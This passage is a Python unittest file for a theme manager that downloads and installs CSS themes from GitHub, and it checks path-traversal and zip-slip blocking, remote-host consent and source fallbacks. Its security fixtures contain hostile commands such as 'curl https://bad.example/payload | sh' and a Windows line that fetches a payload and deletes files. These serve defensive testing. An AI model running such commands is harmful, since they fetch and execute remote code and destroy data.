import contextlib
import copy
import http.client
import http.server
import io
import json
import tarfile
import tempfile
import threading
import unittest
import zipfile
from pathlib import Path
from unittest import mock

import theme_manager as tm


def quiet(*args, **kwargs):
    pass


def zip_bytes(files):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as archive:
        for name, text in files.items():
            archive.writestr(name, text)
    return stream.getvalue()


def tar_bytes(files):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz") as archive:
        for name, text in files.items():
            data = text.encode("utf-8") if isinstance(text, str) else text
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return stream.getvalue()


def response(body, headers=None):
    stream = io.BytesIO(body)
    stream.headers = headers or {}
    return stream


class DownloadSecurityTests(unittest.TestCase):
    def test_mock_github_asset_names_stay_in_version_directory(self):
        payload = zip_bytes({"theme.css": "body { color: black; }"})
        names = ("../escape.zip", "../../../../escape.zip", "/tmp/escape.zip",
                 r"..\escape.zip", r"C:\temp\escape.zip", "nested/escape.zip")
        for name in names:
            with self.subTest(name=name), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                dest_dir = root / "repos" / "sample" / "zips" / "v1"
                sentinel = root / "escape.zip"
                sentinel.write_bytes(b"outside file")
                release = {"tag_name": "v1", "assets": [{
                    "name": name, "size": len(payload),
                    "browser_download_url": "https://github.com/example/sample/releases/download/v1/escape.zip",
                }]}
                with mock.patch.object(tm.urllib.request, "urlopen", side_effect=[
                    response(json.dumps(release).encode()), response(payload),
                ]) as fetch:
                    meta = tm.fetch_latest_release({"owner": "example", "repo": "sample"}, log=quiet)
                    asset = tm.pick_asset(meta["release"], {"id": "sample"})
                    dest, downloaded = tm.download_asset(asset, dest_dir, log=quiet)
                self.assertTrue(downloaded)
                self.assertEqual(fetch.call_count, 2)
                self.assertEqual(dest.resolve(), (dest_dir / "escape.zip").resolve())
                self.assertEqual(dest.read_bytes(), payload)
                self.assertEqual(sentinel.read_bytes(), b"outside file")
                self.assertEqual(list(root.rglob("*.part")), [])
                self.assertEqual(set(root.rglob("*.zip")), {sentinel, dest})

    def test_file_outside_destination_cannot_be_used_as_cached_download(self):
        payload = zip_bytes({"theme.css": "body {}"})
        with tempfile.TemporaryDirectory() as tmp:
            parent = Path(tmp)
            outside = parent / "theme.zip"
            outside.write_bytes(b"x" * len(payload))
            with mock.patch.object(tm.urllib.request, "urlopen", return_value=response(payload)) as fetch:
                dest, downloaded = tm.download_asset({
                    "name": "../theme.zip", "size": len(payload),
                    "browser_download_url": "https://github.com/example/sample/theme.zip",
                }, parent / "v1", log=quiet)
            self.assertTrue(downloaded)
            fetch.assert_called_once()
            self.assertEqual(dest.parent, parent / "v1")
            self.assertEqual(outside.read_bytes(), b"x" * len(payload))

    def test_invalid_download_names_are_rejected_before_writing(self):
        for name in ("", ".", "..", "../..", "/", "theme.zip:stream.zip", "bad\x00.zip"):
            with self.subTest(name=name), tempfile.TemporaryDirectory() as tmp:
                dest_dir = Path(tmp) / "downloads"
                with self.assertRaises(RuntimeError):
                    tm.download_asset({"name": name}, dest_dir, log=quiet)
                self.assertFalse(dest_dir.exists())


    def test_same_size_asset_reupload_is_redownloaded(self):
        # 上游重传资产且字节数恰好相同：updated_at 变化必须触发重下——
        # 否则本地旧缓存会被当作新内容（漏报更新、清空重装写回旧文件）
        with tempfile.TemporaryDirectory() as tmp:
            dest_dir = Path(tmp) / "zips" / "v1"
            payload_v1 = zip_bytes({"theme.css": "body { color: A; }"})
            payload_v2 = zip_bytes({"theme.css": "body { color: B; }"})
            self.assertEqual(len(payload_v1), len(payload_v2))  # STORED：同长内容同长 zip
            asset = {"name": "theme.zip", "size": len(payload_v1),
                     "updated_at": "2026-11-01T00:00:00Z",
                     "browser_download_url": "https://github.com/example/sample/theme.zip"}
            with mock.patch.object(tm.urllib.request, "urlopen",
                                   return_value=response(payload_v1)):
                _dest, new1 = tm.download_asset(asset, dest_dir, log=quiet)
            self.assertTrue(new1)
            with mock.patch.object(tm.urllib.request, "urlopen") as fetch:
                _dest, new2 = tm.download_asset(asset, dest_dir, log=quiet)  # 元数据未变
            self.assertFalse(new2)
            fetch.assert_not_called()
            reupload = dict(asset, updated_at="2026-11-20T00:00:00Z")  # 同大小重传
            with mock.patch.object(tm.urllib.request, "urlopen",
                                   return_value=response(payload_v2)):
                dest, new3 = tm.download_asset(reupload, dest_dir, log=quiet)
            self.assertTrue(new3)
            self.assertEqual(dest.read_bytes(), payload_v2)


class InstallSecurityTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.themes = self.root / "themes"
        self.archive = self.root / "release.zip"
        self.cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
                    "css_dir": "", "theme_re": r"^theme.*\.css$", "assets_dirs": ["fonts"],
                    "min_themes": 1}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": self.cfg}}), encoding="utf-8")
        self.rd = self.root / "repos" / "sample"
        patches = (
            mock.patch.object(tm, "DATA_DIR", self.root / "repos"),
            mock.patch.object(tm, "CONFIG_PATH", self.config),
            mock.patch.object(tm, "detect_themes_dir", return_value=self.themes),
            mock.patch.object(tm, "fetch_latest_release", return_value={
                "release": {"tag_name": "v1", "assets": [{
                    "name": "theme.zip", "browser_download_url": "https://github.com/example/sample/theme.zip",
                }]}, "source": "api", "not_modified": False,
            }),
            mock.patch.object(tm, "download_asset", return_value=(self.archive, False)),
        )
        for patch in patches:
            patch.start()
            self.addCleanup(patch.stop)

    def make_archive(self, css="body {background: url(https://beacon.example/pixel);}", extra=None):
        files = {"theme.css": css}
        files.update(extra or {})
        self.archive.write_bytes(zip_bytes(files))

    def install(self, **options):
        with contextlib.redirect_stdout(io.StringIO()):
            return tm.run_install(copy.deepcopy(self.cfg), log=quiet, **options)

    def test_css_scan_covers_imports_protocol_relative_and_escaped_urls(self):
        self.make_archive(r'''
            @import "https://STYLES.example/base.css";
            @import url('//imports.example/base.css');
            body { background: URL(HTTP://user:secret@BEACON.example:8080/a); }
            @font-face { src: url(//fonts.example/font.woff2); }
            a { background: u\72l(\68ttps\3a //escaped\2e example/pixel); }
            b { background: url(https:\/\/slashes.example/pixel); }
            @import"https://minified.example/base.css";
            @import/**/"https://comment.example/base.css";
            c { background: url("  https://whitespace.example/pixel  "); }
        ''', {"fonts/nested.css": 'body {background: url("https://nested.example/pixel");}'})
        passed, _, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["remote_hosts"], {
            "styles.example", "imports.example", "beacon.example", "fonts.example",
            "escaped.example", "slashes.example", "nested.example", "minified.example",
            "comment.example", "whitespace.example",
        })

    def test_local_and_data_urls_do_not_need_confirmation(self):
        self.make_archive('''
            @import "fonts/local.css";
            body {background: url(../assets/image.png);}
            @font-face {src: url(data:font/woff2;base64,AAAA);}
        ''')
        rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue(result["ok"])
        self.assertTrue((self.themes / "theme.css").is_file())

    def test_malformed_url_does_not_crash_scan(self):
        self.make_archive('body {background: url("https://[broken/pixel");}')
        passed, _, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["remote_hosts"], set())

    def test_unapproved_remote_hosts_pause_before_any_theme_or_baseline_changes(self):
        self.make_archive()
        config_before = self.config.read_bytes()
        rc, result = self.install(update_manifest=True)
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertTrue(result["remote_confirmation_required"])
        self.assertEqual(result["remote_hosts"], ["beacon.example"])
        self.assertFalse(self.themes.exists())
        self.assertFalse((self.rd / "manifest.json").exists())
        self.assertFalse((self.rd / "installed.json").exists())
        self.assertEqual(self.config.read_bytes(), config_before)

    def test_clean_reinstall_keeps_existing_themes_until_consent(self):
        self.make_archive()
        self.themes.mkdir()
        old = self.themes / "theme.css"
        old.write_text("old theme", encoding="utf-8")
        self.rd.mkdir(parents=True)
        tm.save_manifest(self.rd, ["old.css"], "v0")
        baseline = (self.rd / "manifest.json").read_bytes()
        rc, result = self.install(mode="clean", update_manifest=True)
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertEqual(old.read_text(), "old theme")
        self.assertEqual((self.rd / "manifest.json").read_bytes(), baseline)
        self.assertEqual(list(self.root.glob("themes-backup-*")), [])
        self.assertEqual(result["install_options"]["mode"], "clean")
        self.assertTrue(result["install_options"]["update_manifest"])

    def test_explicit_host_consent_installs_without_changing_css(self):
        self.make_archive()
        rc, result = self.install(approved_remote_hosts=["BEACON.EXAMPLE"])
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue(result["ok"])
        with zipfile.ZipFile(self.archive) as archive:
            self.assertEqual((self.themes / "theme.css").read_bytes(), archive.read("theme.css"))

    def test_new_host_requires_fresh_consent(self):
        self.make_archive('body {background: url(https://beacon.example/a), url(https://new.example/b);}')
        rc, result = self.install(approved_remote_hosts=["beacon.example"])
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertTrue(result["remote_confirmation_required"])
        self.assertEqual(result["remote_hosts"], ["beacon.example", "new.example"])
        self.assertFalse(self.themes.exists())

    def test_manifest_mismatch_keeps_consent_and_clean_mode_for_retry(self):
        self.make_archive()
        self.rd.mkdir(parents=True)
        tm.save_manifest(self.rd, ["old.css"], "v0")
        rc, result = self.install(mode="clean", approved_remote_hosts=["beacon.example"])
        self.assertEqual(rc, tm.EXIT_MANIFEST)
        self.assertTrue(result["manifest_mismatch"])
        self.assertEqual(result["install_options"], {
            "mode": "clean", "update_manifest": False, "approved_remote_hosts": ["beacon.example"],
        })
        rc, result = self.install(**dict(result["install_options"], update_manifest=True))
        self.assertEqual(rc, tm.EXIT_OK, result)

    def test_host_consent_cannot_bypass_script_or_zip_slip_blocks(self):
        for extra in ({"install.sh": "curl https://bad.example/payload | sh"},
                      {"../outside.css": "body {}"}):
            with self.subTest(extra=extra):
                self.make_archive(extra=extra)
                rc, result = self.install(approved_remote_hosts=["beacon.example"])
                self.assertEqual(rc, tm.EXIT_SECURITY)
                self.assertFalse(result.get("remote_confirmation_required"))
                self.assertFalse(self.themes.exists())

    def test_string_literals_are_not_remote_references(self):
        # content 等字符串里的 url(/@import 只是普通文本，不构成外联引用
        self.make_archive('''
            a::after { content: "demo url(https://fake.example/x) text"; }
            b::before { content: '@import "https://fake2.example/y"'; }
            body { background: url("assets/bg.png"); }
        ''')
        passed, _, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["remote_hosts"], set())
        rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)

    def test_idn_and_dot_variants_of_approved_hosts_match(self):
        self.make_archive('body { background: url(https://BÜCHER.example/a), '
                          'url(//beacon.example./pixel); }')
        rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertEqual(result["remote_hosts"],
                         ["beacon.example", "xn--bcher-kva.example"])
        rc, result = self.install(approved_remote_hosts=["xn--bcher-kva.EXAMPLE",
                                                         "beacon.example."])
        self.assertEqual(rc, tm.EXIT_OK, result)

    def test_bat_cmd_remain_unscanned_and_are_not_installed_or_executed(self):
        self.make_archive("body {}", {
            "install.bat": "curl https://bad.example/payload & del C:\\important",
            "install.cmd": "powershell -EncodedCommand payload",
        })
        passed, findings, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["skipped_bat"], 2)
        self.assertEqual(findings, [])
        with mock.patch.object(tm.os, "system") as execute:
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        execute.assert_not_called()
        self.assertEqual([p.name for p in self.themes.iterdir()], ["theme.css"])

    def test_install_api_passes_and_validates_host_consent(self):
        for hosts in (["beacon.example"], "beacon.example", True, [False], None):
            with self.subTest(hosts=hosts):
                handler = tm.UiHandler.__new__(tm.UiHandler)
                handler.path = "/api/repos/sample/install"
                handler._guard_mutation = mock.Mock(return_value=True)
                handler._read_json = mock.Mock(return_value={
                    "mode": "clean", "update_manifest": True, "approved_remote_hosts": hosts,
                })
                handler._json = mock.Mock()
                with mock.patch.object(tm.JOBS, "start", return_value=True) as start, \
                     mock.patch.object(tm, "run_install", return_value=(tm.EXIT_OK, {})) as install:
                    handler.do_POST()
                    if isinstance(hosts, list) and all(isinstance(h, str) for h in hosts):
                        start.call_args[0][2](quiet)
                        install.assert_called_once_with(self.cfg, mode="clean", update_manifest=True,
                                                        approved_remote_hosts=hosts, log=quiet)
                    else:
                        start.assert_not_called()
                        self.assertEqual(handler._json.call_args[0][1], 400)


class SourceFallbackTests(unittest.TestCase):
    """安装来源三级降级链：release 压缩包(tar) → release 附件散文件 → 源码树。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.themes = self.root / "themes"
        self.cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
                    "asset_re": None, "css_dir": None, "theme_re": None,
                    "assets_dirs": None, "bridge": None, "min_themes": None}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": self.cfg}}), encoding="utf-8")
        self.rd = self.root / "repos" / "sample"
        for patch in (mock.patch.object(tm, "DATA_DIR", self.root / "repos"),
                      mock.patch.object(tm, "CONFIG_PATH", self.config),
                      mock.patch.object(tm, "detect_themes_dir", return_value=self.themes)):
            patch.start()
            self.addCleanup(patch.stop)

    def install(self, cfg=None):
        with contextlib.redirect_stdout(io.StringIO()):
            return tm.run_install(copy.deepcopy(cfg or self.cfg), log=quiet)

    def read_config(self):
        return json.loads(self.config.read_text(encoding="utf-8"))["repos"]["sample"]

    def test_tar_asset_is_repackaged_and_installed(self):
        archive = self.rd / "zips" / "v1" / "theme.tar.gz"
        archive.parent.mkdir(parents=True)
        archive.write_bytes(tar_bytes({"sample-1.0/theme.css": "body { color: red; }"}))
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": {"tag_name": "v1", "assets": [{
                "name": "theme.tar.gz", "size": archive.stat().st_size,
                "browser_download_url": "https://github.com/example/sample/theme.tar.gz",
            }]}, "source": "api", "not_modified": False,
        }), mock.patch.object(tm, "download_asset", return_value=(archive, True)):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertEqual((self.themes / "theme.css").read_text(encoding="utf-8"),
                         "body { color: red; }")
        # tar 资产保留归档，同时重组出统一安装包 package.zip
        self.assertTrue((self.rd / "zips" / "v1" / "theme.tar.gz").exists())
        staged = self.rd / "zips" / "v1" / "package.zip"
        self.assertTrue(staged.exists())
        with zipfile.ZipFile(staged) as zf:
            self.assertEqual(zf.namelist(), ["theme.css"])
        self.assertEqual(self.read_config()["source"], "release-archive")

    def test_loose_release_files_are_staged_and_selectively_installed(self):
        css = "body { color: blue; }"
        urls = {
            "https://github.com/example/sample/releases/download/v1/theme.css": css.encode(),
            "https://github.com/example/sample/releases/download/v1/screenshot.png": b"\x89PNG",
            "https://github.com/example/sample/releases/download/v1/theme.woff2": b"FONT",
        }
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": {"tag_name": "v1", "assets": [
                {"name": name, "size": len(data), "browser_download_url": url,
                 "updated_at": "2026-11-01T00:00:00Z"}
                for url, data in urls.items() for name in [url.rsplit("/", 1)[1]]
            ]}, "source": "api", "not_modified": False,
        }), mock.patch.object(tm, "download_bytes",
                             side_effect=lambda url: urls[url]):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        # 主题 CSS 落根；根级字体作为资源条目安装；截图属于选择性安装排除项
        self.assertEqual((self.themes / "theme.css").read_text(encoding="utf-8"), css)
        self.assertEqual((self.themes / "theme.woff2").read_bytes(), b"FONT")
        self.assertFalse((self.themes / "screenshot.png").exists())
        cfg = self.read_config()
        self.assertEqual(cfg["source"], "release-files")
        self.assertEqual(cfg["assets_dirs"], ["theme.woff2"])
        # 基准清单覆盖全部附件（与安装包口径一致）
        manifest = json.loads((self.rd / "manifest.json").read_text(encoding="utf-8"))
        self.assertEqual(manifest["files"], ["screenshot.png", "theme.css", "theme.woff2"])

    def test_git_tree_repo_without_release_installs_from_source(self):
        css, font = b"body { color: green; }", b"WOFF2"
        blobs = {"theme.css": tm.git_blob_sha(css),
                 "fonts/theme.woff2": tm.git_blob_sha(font),
                 "README.md": tm.git_blob_sha(b"readme")}
        anchor = "0f1e2d3c4b5a6978869706151413121110f1e2d3"
        raw = {
            "https://raw.githubusercontent.com/example/sample/main/theme.css": css,
            "https://raw.githubusercontent.com/example/sample/main/fonts/theme.woff2": font,
        }
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True,
            "not_modified": False,
        }), mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": sorted(blobs), "blobs": blobs, "anchor": anchor,
                 "etag": "W/\"tree\"", "not_modified": False,
             }), mock.patch.object(tm, "download_bytes", side_effect=lambda url: raw[url]):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertEqual((self.themes / "theme.css").read_bytes(), css)
        self.assertEqual((self.themes / "fonts" / "theme.woff2").read_bytes(), font)
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["version"], anchor[:7])
        # 基准清单口径=安装集（README 等仓库文件不扰动清单比对）
        manifest = json.loads((self.rd / "manifest.json").read_text(encoding="utf-8"))
        self.assertEqual(manifest["files"], ["fonts/theme.woff2", "theme.css"])
        cfg = self.read_config()
        self.assertEqual(cfg["source"], "git-tree")
        self.assertEqual(cfg["branch"], "main")

    def test_unsupported_archive_falls_through_to_source_tree(self):
        css = b"body { color: gray; }"
        blobs = {"theme.css": tm.git_blob_sha(css)}
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            # 只有 7z 资产（标准库不支持）且无散文件 → 降级到源码树
            "release": {"tag_name": "v1", "assets": [
                {"name": "theme.7z", "size": 10,
                 "browser_download_url": "https://github.com/example/sample/theme.7z"},
            ]}, "source": "api", "not_modified": False,
        }), mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": ["theme.css"], "blobs": blobs,
                 "anchor": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                 "etag": "", "not_modified": False,
             }), mock.patch.object(tm, "download_bytes", return_value=css):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue((self.themes / "theme.css").is_file())
        self.assertEqual(self.read_config()["source"], "git-tree")

    def test_bare_gz_asset_falls_through_to_source_tree(self):
        # 裸 .gz/.bz2/.xz 是单文件压缩而非归档：不能选作压缩包（tarfile 打不开
        # 非 tar 流），也不能当散文件安装 → 提示后降级到源码树
        css = b"body { color: olive; }"
        blobs = {"theme.css": tm.git_blob_sha(css)}
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": {"tag_name": "v1", "assets": [
                {"name": "theme.css.gz", "size": 10,
                 "browser_download_url": "https://github.com/example/sample/theme.css.gz"},
            ]}, "source": "api", "not_modified": False,
        }), mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": ["theme.css"], "blobs": blobs,
                 "anchor": "b" * 40, "etag": "", "not_modified": False,
             }), mock.patch.object(tm, "download_bytes", return_value=css):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue((self.themes / "theme.css").is_file())
        self.assertEqual(self.read_config()["source"], "git-tree")

    def test_git_tree_remote_host_gate_persists_nothing(self):
        css = b"body { background: url(https://beacon.example/pixel); }"
        blobs = {"theme.css": tm.git_blob_sha(css)}
        config_before = self.config.read_bytes()
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True,
            "not_modified": False,
        }), mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": ["theme.css"], "blobs": blobs,
                 "anchor": "cccccccccccccccccccccccccccccccccccccccc",
                 "etag": "", "not_modified": False,
             }), mock.patch.object(tm, "download_bytes", return_value=css):
            rc, result = self.install()
        # CSS 远程主机确认门在任何持久化之前：结构推断（git-tree 为临时计算）、
        # 来源/分支字段、基准清单、主题目录均未落盘
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertTrue(result["remote_confirmation_required"])
        self.assertEqual(self.config.read_bytes(), config_before)
        self.assertFalse(self.themes.exists())
        self.assertFalse((self.rd / "manifest.json").exists())
        self.assertFalse((self.rd / "installed.json").exists())

    def test_check_without_release_uses_tree_anchor_and_tracked_hashes(self):
        cfg = dict(self.cfg, source="git-tree", branch="main",
                   css_dir="", theme_re=r"^[^/]+\.css$", assets_dirs=[],
                   min_themes=1)
        old_css = b"body { old }"
        new_css = b"body { new }"
        installed = {"version": "oldtree", "mode": "matched",
                     "files": ["theme.css"],
                     "tracked": {"theme.css": {"hash": tm.git_blob_sha(old_css), "ts": ""}},
                     "tracked_meta": {"kind": "git-tree", "anchor": "x" * 40}}
        self.rd.mkdir(parents=True)
        (self.rd / "installed.json").write_text(json.dumps(installed), encoding="utf-8")
        blobs = {"theme.css": tm.git_blob_sha(new_css)}
        with mock.patch.object(tm, "fetch_git_tree", return_value={
            "files": ["theme.css"], "blobs": blobs,
            "anchor": "newtree" + "0" * 33, "etag": "W/\"t\"",
            "not_modified": False,
        }):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_check(copy.deepcopy(cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertNotEqual(result["version"], "oldtree")
        # 记录的哈希与仓库侧不一致 → 报告内容变更（不看本地文件）
        self.assertIn("theme.css", result["message"])
        latest = json.loads((self.rd / "latest.json").read_text(encoding="utf-8"))
        self.assertEqual(latest["source_kind"], "git-tree")
        self.assertEqual(latest["anchor"], "newtree" + "0" * 33)

    def test_check_tree_not_modified_reuses_cached_anchor(self):
        cfg = dict(self.cfg, source="git-tree", branch="main",
                   css_dir="", theme_re=r"^[^/]+\.css$", assets_dirs=[])
        self.rd.mkdir(parents=True)
        (self.rd / "latest.json").write_text(json.dumps(
            {"tag": "oldtree", "anchor": "oldtree" + "0" * 33, "etag": "W/\"t\"",
             "source_kind": "git-tree"}), encoding="utf-8")
        (self.rd / "installed.json").write_text(json.dumps(
            {"version": "oldtree", "mode": "matched", "files": ["theme.css"],
             "tracked": {"theme.css": {"hash": "sha", "ts": ""}}}), encoding="utf-8")
        with mock.patch.object(tm, "fetch_git_tree", return_value={
            "files": None, "blobs": None, "anchor": "", "etag": "W/\"t\"",
            "not_modified": True,
        }):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_check(copy.deepcopy(cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertEqual(result["version"], "oldtree")
        self.assertNotIn("theme.css", result["message"])

    def test_check_with_release_keeps_tag_semantics(self):
        cfg = dict(self.cfg, source="release-archive", css_dir="",
                   theme_re=r"^theme\.css$", assets_dirs=[])
        self.rd.mkdir(parents=True)
        (self.rd / "installed.json").write_text(json.dumps(
            {"version": "v1", "mode": "merge", "files": ["theme.css"]}), encoding="utf-8")
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": {"tag_name": "v1", "assets": [{
                "name": "theme.zip", "size": 10, "updated_at": "2026-11-01T00:00:00Z",
                "browser_download_url": "https://github.com/example/sample/theme.zip",
            }]}, "source": "api", "not_modified": False,
        }):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_check(copy.deepcopy(cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        latest = json.loads((self.rd / "latest.json").read_text(encoding="utf-8"))
        self.assertEqual(latest["tag"], "v1")
        self.assertEqual(latest["asset"], "theme.zip")
        self.assertEqual(latest["source_kind"], "release-archive")


class ManualMatchTests(unittest.TestCase):
    """第 4 级来源：本地文件按哈希与仓库内容对齐并登记。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.themes = self.root / "themes"
        self.cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
                    "asset_re": None, "css_dir": None, "theme_re": None,
                    "assets_dirs": None, "bridge": None, "min_themes": None}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": self.cfg}}), encoding="utf-8")
        self.rd = self.root / "repos" / "sample"
        for patch in (mock.patch.object(tm, "DATA_DIR", self.root / "repos"),
                      mock.patch.object(tm, "CONFIG_PATH", self.config),
                      mock.patch.object(tm, "detect_themes_dir", return_value=self.themes)):
            patch.start()
            self.addCleanup(patch.stop)

    def read_config(self):
        return json.loads(self.config.read_text(encoding="utf-8"))["repos"]["sample"]

    def test_match_against_source_tree_registers_without_touching_themes(self):
        css = b"body { color: purple; }"
        font = b"FONTDATA"
        blobs = {"theme.css": tm.git_blob_sha(css),
                 "fonts/theme.woff2": tm.git_blob_sha(font),
                 "README.md": tm.git_blob_sha(b"readme")}
        anchor = "abc1234567890abcdef1234567890abcdef1234"
        with mock.patch.object(tm, "fetch_all_releases", return_value=[]), \
             mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": sorted(blobs), "blobs": blobs, "anchor": anchor,
                 "etag": "", "not_modified": False,
             }):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_match(copy.deepcopy(self.cfg),
                                          uploads=[("theme.css", css),
                                                   ("renamed-font.woff2", font),
                                                   ("unrelated.css", b"nothing matches")],
                                          log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue(result["ok"])
        # 只登记，不改动主题目录
        self.assertFalse(self.themes.exists())
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["mode"], "matched")
        self.assertEqual(installed["version"], anchor[:7])
        self.assertEqual(installed["files"], ["fonts/theme.woff2", "theme.css"])
        tracked = installed["tracked"]
        self.assertEqual(tracked["theme.css"]["hash"], tm.git_blob_sha(css))
        self.assertEqual(tracked["fonts/theme.woff2"]["hash"], tm.git_blob_sha(font))
        self.assertNotIn("README.md", tracked)
        self.assertEqual(result["unmatched"], ["unrelated.css"])
        # 结构与来源写入注册表；基准清单=安装集口径
        cfg = self.read_config()
        self.assertEqual(cfg["source"], "git-tree")
        self.assertEqual(cfg["theme_re"], "^[^/]+\\.css$")
        manifest = json.loads((self.rd / "manifest.json").read_text(encoding="utf-8"))
        self.assertEqual(manifest["files"], ["fonts/theme.woff2", "theme.css"])

    def test_match_failure_writes_nothing(self):
        with mock.patch.object(tm, "fetch_all_releases", return_value=[]), \
             mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": ["theme.css"],
                 "blobs": {"theme.css": tm.git_blob_sha(b"upstream")},
                 "anchor": "a" * 40, "etag": "", "not_modified": False,
             }):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_match(copy.deepcopy(self.cfg),
                                          uploads=[("x.css", b"totally different")], log=quiet)
        self.assertEqual(rc, tm.EXIT_DOWNLOAD)
        self.assertFalse(result["ok"])
        self.assertFalse((self.rd / "installed.json").exists())
        self.assertFalse(self.read_config().get("theme_re"))

    def test_match_against_release_archive_hashes(self):
        css = b"body { color: teal; }"
        payload = zip_bytes({"sample-1.0/theme.css": css.decode(),
                             "sample-1.0/README.md": "docs"})
        archive = self.rd / "zips" / "v1" / "theme.zip"
        archive.parent.mkdir(parents=True)
        archive.write_bytes(payload)
        with mock.patch.object(tm, "fetch_all_releases", return_value=[{
            "tag_name": "v1", "assets": [{
                "name": "theme.zip", "size": len(payload),
                "updated_at": "2026-11-01T00:00:00Z",
                "browser_download_url": "https://github.com/example/sample/theme.zip",
            }],
        }]), mock.patch.object(tm, "download_asset", return_value=(archive, False)):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_match(copy.deepcopy(self.cfg),
                                          uploads=[("anything.css", css)], log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["tracked"]["theme.css"]["hash"], tm.sha256_hex(css))
        self.assertEqual(installed["tracked_meta"]["kind"], "release-archive")
        self.assertEqual(installed["tracked_meta"]["asset"], "theme.zip")
        manifest = json.loads((self.rd / "manifest.json").read_text(encoding="utf-8"))
        self.assertEqual(manifest["files"], ["README.md", "theme.css"])

    def test_match_falls_through_to_source_tree_when_release_differs(self):
        # 有 release，但其内容与上传文件哈希不一致 → 继续遍历到源码树命中
        css_tree = b"body { color: from-tree; }"
        css_release = b"body { color: from-release; }"
        archive = self.rd / "zips" / "v2" / "theme.zip"
        archive.parent.mkdir(parents=True)
        archive.write_bytes(zip_bytes({"sample-2.0/theme.css": css_release.decode()}))
        blobs = {"theme.css": tm.git_blob_sha(css_tree)}
        with mock.patch.object(tm, "fetch_all_releases", return_value=[{
            "tag_name": "v2", "assets": [{
                "name": "theme.zip", "size": archive.stat().st_size,
                "updated_at": "2026-11-05T00:00:00Z",
                "browser_download_url": "https://github.com/example/sample/v2/theme.zip",
            }],
        }]), mock.patch.object(tm, "download_asset", return_value=(archive, False)), \
